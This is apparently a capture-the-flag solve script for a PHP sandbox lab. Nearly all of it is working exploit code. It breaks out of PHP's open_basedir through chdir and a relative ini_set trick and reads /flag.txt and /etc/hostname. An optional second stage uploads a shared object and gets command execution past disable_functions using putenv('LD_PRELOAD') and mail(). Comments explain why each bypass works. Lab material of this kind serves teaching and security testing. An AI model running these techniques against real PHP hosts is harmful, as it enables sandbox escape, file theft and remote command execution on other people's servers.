#!/usr/bin/env python3
"""
Lab 18 - PHPlayground / open_basedir jailbreak.

Stage 1 (default, this is what verify.sh asserts)
    Walk out of open_basedir with chdir()+ini_set() and read /flag.txt.

Stage 2 (--rce, optional)
    Command execution in spite of disable_functions, via putenv('LD_PRELOAD')
    plus mail().  Needs ./hook.so next to this script; build it with
    `make preload`.

Python 3 standard library only.
"""

import base64
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

TIMEOUT = 25


def run_php(base, code):
    """eval() `code` inside the sandbox and return the raw response body."""
    body = urllib.parse.urlencode(
        {"code": base64.b64encode(code.encode()).decode(), "b64": "1"}
    ).encode()
    req = urllib.request.Request(
        base.rstrip("/") + "/sandbox/run.php",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
        return resp.read().decode("utf-8", "replace")


def show(title, text):
    print("-" * 62)
    print(title)
    print("-" * 62)
    for line in text.strip().splitlines():
        print("  | " + line)
    print()


# --------------------------------------------------------------------------
# stage 0 - prove the jail is really there
# --------------------------------------------------------------------------
PROBE = r"""
echo "system() exists : ", var_export(function_exists('system'), true), "\n";
echo "naive read      : ", var_export(@file_get_contents('/flag.txt'), true), "\n";
echo "naive listing   : ", var_export(@scandir('/'), true), "\n";
echo "open_basedir    : ", ini_get('open_basedir'), "\n";
echo "straight ini_set: ", var_export(@ini_set('open_basedir', '/'), true), "\n";
echo "dotdot  ini_set : ", var_export(@ini_set('open_basedir', '..'), true), "\n";
"""

# --------------------------------------------------------------------------
# stage 1 - the jailbreak
# --------------------------------------------------------------------------
# 1. mkdir()+chdir() so that the cwd is one level BELOW the open_basedir root.
# 2. ini_set('open_basedir', './..').  OnUpdateBaseDir() only rejects entries
#    whose *first* path component is literally "..", and "./.." expands (from
#    the cwd) to the jail root, which is inside the current open_basedir - so
#    the assignment is accepted as "at least as restrictive".
# 3. open_basedir is now a RELATIVE path.  It is re-expanded against the cwd
#    on every single check, so each chdir('..') drags the jail up with it.
# 4. At "/" the relative jail is "/" as well; pin it and read the flag.
ESCAPE = r"""
$dir = 'esc_' . bin2hex(random_bytes(6));
@mkdir($dir);
chdir($dir);
echo "S1 cwd            = ", getcwd(), "\n";
echo "S1 ini_set('./..')= ", var_export(@ini_set('open_basedir', './..'), true), "\n";
echo "S1 open_basedir   = ", ini_get('open_basedir'), "\n";
for ($i = 0; $i < 40 && getcwd() !== '/'; $i++) {
    if (!@chdir('..')) { echo "S1 chdir('..') refused at ", getcwd(), "\n"; break; }
}
echo "S1 cwd            = ", getcwd(), "\n";
echo "S1 ini_set('/')   = ", var_export(@ini_set('open_basedir', '/'), true), "\n";
echo "S1 open_basedir   = ", ini_get('open_basedir'), "\n";
echo "S1 /etc/hostname  = ", trim((string)@file_get_contents('/etc/hostname')), "\n";
echo "FLAG:", trim((string)@file_get_contents('/flag.txt')), "\n";
@rmdir('/var/www/sandbox/' . $dir);
"""

# --------------------------------------------------------------------------
# stage 2 - RCE despite disable_functions (optional)
# --------------------------------------------------------------------------
# disable_functions kills every obvious exec primitive, but it forgot putenv()
# and mail().  mail() shells out through popen("/usr/sbin/sendmail -t -i"),
# i.e. it execve()s /bin/sh -- and /bin/sh honours LD_PRELOAD, which putenv()
# just set.  The constructor in hook.so runs before sh even parses its command
# line, so it does not matter that sendmail is not installed in the image.
RCE = r"""
$so  = __DIR__ . '/hook_%(tag)s.so';
$out = __DIR__ . '/out_%(tag)s.txt';
file_put_contents($so, base64_decode('%(so)s'));
echo "S2 wrote ", $so, " (", filesize($so), " bytes)\n";
putenv('PWN_CMD=(id; uname -srm; cat /flag.txt) > ' . $out . ' 2>&1; chmod 644 ' . $out);
putenv('LD_PRELOAD=' . $so);
@mail('a@b.invalid', 'x', 'y');
putenv('LD_PRELOAD');
for ($i = 0; $i < 50 && !@file_exists($out); $i++) { usleep(100000); }
echo "S2 command output:\n", (string)@file_get_contents($out), "\n";
@unlink($so); @unlink($out);
"""


def main():
    base = sys.argv[1] if len(sys.argv) > 1 else "http://challenge"
    want_rce = "--rce" in sys.argv[1:]
    print(f"[*] target: {base}")

    try:
        show("[0] what the sandbox allows", run_php(base, PROBE))
    except urllib.error.URLError as exc:
        print(f"[-] cannot reach the sandbox: {exc}")
        return 1

    out = run_php(base, ESCAPE)
    show("[1] open_basedir escape", out)

    flag = None
    for line in out.splitlines():
        if line.startswith("FLAG:") and "PHRACK{" in line:
            flag = line.split("FLAG:", 1)[1].strip()

    if want_rce:
        so_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hook.so")
        if not os.path.exists(so_path):
            print("[-] hook.so missing - run `make preload` first; skipping stage 2")
        else:
            with open(so_path, "rb") as fh:
                blob = base64.b64encode(fh.read()).decode()
            payload = RCE % {"so": blob, "tag": os.urandom(4).hex()}
            show("[2] RCE via putenv(LD_PRELOAD) + mail()", run_php(base, payload))

    if not flag:
        print("[-] no flag recovered")
        return 1
    print(f"FLAG: {flag}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
